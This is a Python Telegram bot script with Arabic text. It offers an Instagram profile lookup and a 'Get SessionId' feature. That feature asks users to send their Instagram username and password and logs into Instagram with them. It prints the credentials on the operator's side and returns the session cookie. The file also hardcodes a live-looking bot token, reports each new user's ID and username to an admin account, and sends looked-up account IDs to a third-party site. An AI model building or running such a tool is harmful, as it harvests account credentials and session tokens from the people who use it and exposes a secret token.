import os
#os.system("install telebot")
#os.system("install pip install pyTelegramBotAPI")
#os.system("install pip install pyTelegramBotAPI==4.7.1")
import telebot 
import requests 
from telebot import types 
Token  = "5545432251:AAF9dgBTEUIcOAEEUjLct94qhstc3222yIA"
bot = telebot.TeleBot(Token,skip_pending=True)
def Ch_id(id):
    ch = False
    file = open("users.txt",'r')
    for line in file:
        if str(line.strip()) == str(id):
            ch = True
    file.close()
    return ch
@bot.message_handler(commands=["start"])
def A(message):
    ch = '@dtdtdt'
    sudo_id = "1372680721"
    token=Token
    idd = message.from_user.id
    url = f"https://api.telegram.org/bot{token}/getchatmember?chat_id={ch}&user_id={idd}"
    req = requests.get(url)
    if idd == sudo_id or 'member' in req.text or 'creator' in req.text or 'administartor' in req.text:
        idu = message.from_user.id
        nam = message.from_user.first_name
        us = message.from_user.username
        id_user = str(message.from_user.id)
        ck = Ch_id(str(id_user))
        if ck == False:
            file =open ("users.txt", "a").write(str(id_user)+"\n")
            file_users = open("users.txt",'r').readlines()
            users = len(file_users)
            ide = "1372680721"
            fg = bot.send_message(ide,f"""تم دخول شخص جديد :{users}
    	        ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
    	        ❂ - 𝚄𝚂𝙴𝚁 ⟿ @{us} 🤍..
    	        ❂ - 𝙸𝙳 𝚂𝚃𝙰 ⟿ {idu} 🤍.  
    	        ❂ - NAME 𝚂𝚃𝙰 ⟿ {nam} 🤍.  
    	        ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉	        
    	        """)    
        Id =message.chat.id
        Name = message.chat.first_name
        User = message.from_user.username
        A = types.InlineKeyboardMarkup(row_width = 3)
        B = types.InlineKeyboardButton(text = "info username insta",callback_data = "A")
        C = types.InlineKeyboardButton(text = "Get SessionId",callback_data = "insta0")
        #mm = types.InlineKeyboardButton(text = "أضفني الى مجموعتك↗️",url = "https://t.me/DtDtDtBot?startgroup=text")
        A.add(B,C)
    
        bot.send_message(message.chat.id,"""
    *➖ 👋اهلا عزيزي *  [{}]""".format(Name),parse_mode="markdown",reply_markup=A)
    else:
        A = types.InlineKeyboardMarkup(row_width = 1)
        B = types.InlineKeyboardButton(text = '''"𝙰𝙻𝙾𝚂𝙷"𝙿𝚈𝚃𝙷𝙾𝙽"''',url="https://t.me/DtDtDt")
        A.add(B)
        bot.send_message(message.chat.id, """*🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- مــعرف القـناة : {} 

‼️| اشترك ثم ارسل /start*""".format(ch),parse_mode="markdown",reply_markup=A)
@bot.callback_query_handler(func=lambda call: True)
def Hhh(call):
    if call.data == "A":
        us = bot.reply_to(call.message,text="*✅ Send your username*",parse_mode='markdown')
        bot.register_next_step_handler(us,get_info)
    elif call.data == "insta0":
        ak = bot.reply_to(call.message,text="*ارسل حسابك ب نمط\n user:pass*",parse_mode='markdown')
        bot.register_next_step_handler(ak,get_sessionid)
def get_info(message):
    try:   
        bot.reply_to(message,text=f"*✅ wait...*",parse_mode="markdown")                       
        msg  = message.text 
        url =(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={msg}")
        head = {'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
        i =requests.get(url, headers=head)
        bot.send_message(message.chat.id,f"ResPosne : {i}") 
        req=i.json()	  
        print(req)
        following =req['data']['user']['edge_follow']['count']
        id=req['data']['user']['id']
        #print(id)
        name=req['data']['user']['full_name']
        followes = req['data']['user']['edge_followed_by']['count']
        date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]
        bio=req['data']['user']['biography']
        pro=req ['data']['user']['profile_pic_url_hd']
        #bot.send_photo(message.chat.id,pro,f"photo : [Open]({pro})",parse_mode="markdown")
        bot.send_photo(message.chat.id,pro,f"""
*✅ ᯓ تم سحب معلومات الحساب بنجاح
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ name : {name}
ᯓ 𝚄𝚂𝙴𝚁 : {message.text}       
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 :  {id}
ᯓ bio :  {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {date}
ᯓ ʟɪɴᴋ : https://instagram.com/{message.text}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
By : @aaalaaa*
                          """, parse_mode="markdown")
    
    except:
     	  bot.send_message(message.chat.id,"Error User .") 	  
     	  

def get_sessionid(message):
	try:							
		username=message.text.split(':')[0]
		password=message.text.split(':')[1]
		print(username,password)
		url = "https://www.instagram.com/accounts/login/ajax/"
		cookies =""				
		headers ={
"accept": "*/*",
"set-cookie":"csrftoken=RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP; Domain=.instagram.com; expires=Mon, 16-Jan-2023 13:05:57 GMT; Max-Age=31449600; Path=/; Secure",
"accept-encoding":"gzip, deflate, br",
"accept-language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
"content-length": "321",
"content-type": "application/x-www-form-urlencoded",
'sec-ch-ua':'"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Windows"',
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-origin",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
"x-asbd-id": "198387",
"x-csrftoken": "RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "0",
"x-instagram-ajax": "bc3569920aaf",
"x-requested-with": "XMLHttpRequest"}
		data= {
"username": str(username),
"enc_password": "#PWD_INSTAGRAM_BROWSER:0:9775445428:"+str(password),
"optIntoOneTap": "false",
"queryParams": {},
"stopDeletionNonce": "",
"trustedDeviceRecords": {}}
		req = requests.post(url,headers=headers,data=data)
		if '"authenticated":true' in req.text:
			sessionid=req.cookies['sessionid']
			bot.reply_to(message,text=f"""
*✅ sessionid
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ sessionid :*`{sessionid}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
 ✅ Account Isntagram
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯*
*ᯓ User : *`{username}`
*ᯓ Pass : *`{password}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ By : @aaalaaa*""",parse_mode='markdown')
			print(sessionid)
		elif '"message":"checkpoint_required"' in req.text:
			bot.reply_to(message,text='🔐 secure Account')	
		elif '"authenticated":false' in req.text:
			u=("❌ Erorr Account ")
			print(u)
			bot.reply_to(message,text=u)		
	except:
		bot.reply_to(message,text="عذرا لم اجد كهاذا زر!!")	
@bot.message_handler(commands=['All'])
def App_Admin(message):
    id_user = str(message.from_user.id)
    if str(id_user) == str("1372680721"):
        bot.send_message(message.chat.id, text=f"* دز لكليشة حبي 👻*",parse_mode="markdown")
        @bot.message_handler(func=lambda m: True)
        def ail(message):
            all = str(message.text)
            file = open("users.txt",'r')
            c = 0
            for i in file:
                bot.send_message(i, text=f"""{all}""")
                c+=1
            bot.send_message(message.chat.id, text = f"*تمت الاذاعة الة {c} منا الاشخاص *",parse_mode="markdown")
            c = 0
    else:
        bot.send_message(message.chat.id, text ="*ما تصير أدمن لو رب ربك يجي 😂 \n لتحاول بعد يول *",parse_mode="markdown")
        pass		
bot.polling()